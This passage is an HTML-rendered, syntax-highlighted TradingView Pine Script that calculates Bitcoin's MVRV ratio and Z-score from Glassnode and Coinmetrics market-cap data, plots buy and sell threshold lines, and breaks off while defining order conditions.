&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Inputs  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Strategymode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Strategy Mode&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Switches between indicator and strategy mode.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Calculation &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Standard&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Calculation Method&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;options &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Standard&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Free Float&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; tooltip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;The standard calculation uses the market cap while the free float version uses the free float market cap.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Source &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Glassnode&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Market Cap Source&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;options &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Glassnode&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Coinmetrics&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Upper &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Upper Line&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;tooltip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Z-Score value above which a sell signal is given, standard is 7.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Lower &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Lower Line&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;tooltip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Z-Score value below which a buy signal is given, standard is 0.1.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Query  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;MC1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;GLASSNODE:BTC_MARKETCAP&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;MC2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;CRYPTOCAP:BTC&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;MCF&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;COINMETRICS:BTC_MARKETCAPFF&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;MCR&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;COINMETRICS:BTC_MARKETCAPREAL&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Initialize var  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; float &lt;span class=&#34;token constant&#34;&gt;MC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;MCA&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; array&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;float&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; float &lt;span class=&#34;token constant&#34;&gt;MVRV&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; float Zscore &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Calculations  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; Source&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Glassnode&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token constant&#34;&gt;MC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;MC1&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token constant&#34;&gt;MC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;MC2&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;array&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCA&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;StdDevA &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; array&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;stdev&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCA&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; Calculation&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Standard&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token constant&#34;&gt;MVRV&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;MC&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCR&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; Calculation&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Free Float&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token constant&#34;&gt;MVRV&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;MCF&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCR&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; Calculation&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Standard&#34;&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Zscore &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MC&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;StdDevA  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; Calculation&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Free Float&#34;&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Zscore &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCF&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MCR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;StdDevA  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Plotting  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;MVRVplot &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;plot&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MVRV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;MVRV&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; color&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;color&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;blue&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;transp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Zplot &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;plot&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Zscore&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Z-score&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;color&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;color&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;yellow&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;linewidth &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;UpperLine &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Zscore&lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt;Upper&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;Upper&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;na  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LowerLine &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Zscore&lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt;Lower&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;Lower&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;na  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Lower and UpperLine are undefined when Zscore isn&#39;t close to them so they don&#39;t affect panel scaling.  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;UpperPlot &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;plot&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;UpperLine&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; transp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; trackprice &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; color&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;color&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;red&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; display&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;display&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;all&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;display&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;status_line&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LowerPlot &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;plot&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;LowerLine&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; transp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; trackprice &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; color&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;color&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;green&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; display&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;display&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;all&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;display&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;status_line&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;fill&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;plot1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;Zplot&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;plot2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;UpperPlot&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;color&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;color&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;red&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; transp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;fill&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;plot1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;Zplot&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;plot2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LowerPlot&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;color&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;color&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;green&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; transp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Order Conditions  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Long &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ta&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;crossunder&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Zscore&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;Lower&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;TakeProfit &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ta&lt;span class=&#34;token 